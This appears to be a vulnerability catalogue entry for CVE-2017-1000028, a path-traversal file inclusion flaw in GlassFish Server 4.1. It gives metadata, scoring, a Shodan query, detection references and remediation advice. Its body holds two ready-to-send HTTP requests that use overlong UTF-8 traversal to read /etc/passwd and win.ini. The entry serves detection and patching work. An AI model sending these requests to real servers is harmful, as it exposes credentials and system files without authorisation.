---
layout: post
cve_id: CVE-2017-1000028
title: Oracle GlassFish Server Open Source Edition 4.1 - Local File Inclusion
pcap: true
pcap_path: /pcaps/2017/CVE-2017-1000028.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2017/CVE-2017-1000028.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pikpikcu,daffainfo
severity: high
impact: 'Unauthenticated attackers can read arbitrary files including configuration
  files, database credentials, and sensitive system files, potentially leading to
  complete server compromise.

  '
remediation: 'Apply the necessary patches or updates provided by Oracle to fix the
  LFI vulnerability in GlassFish Server.

  '
reference:
- https://www.exploit-db.com/exploits/45196
- https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18822
- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904
- https://www.exploit-db.com/exploits/45196/
- https://nvd.nist.gov/vuln/detail/CVE-2017-1000028
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2017-1000028
  cwe-id: CWE-22
  epss-score: 0.94123
  epss-percentile: 0.99907
  cpe: cpe:2.3:a:oracle:glassfish_server:4.1:*:*:*:open_source:*:*:*
metadata:
  max-request: 2
  vendor: oracle
  product: glassfish_server
  shodan-query: cpe:"cpe:2.3:a:oracle:glassfish_server"
tags:
- cve
- cve2017
- oracle
- glassfish
- lfi
- edb
- vkev
- vuln
---

## üîç Vulnerability Description
Oracle GlassFish Server Open Source Edition 4.1 is vulnerable to both authenticated and unauthenticated local file inclusion vulnerabilities that can be exploited by issuing specially crafted HTTP GET requests.

## üåê HTTP Request
```nohighlight
GET /theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

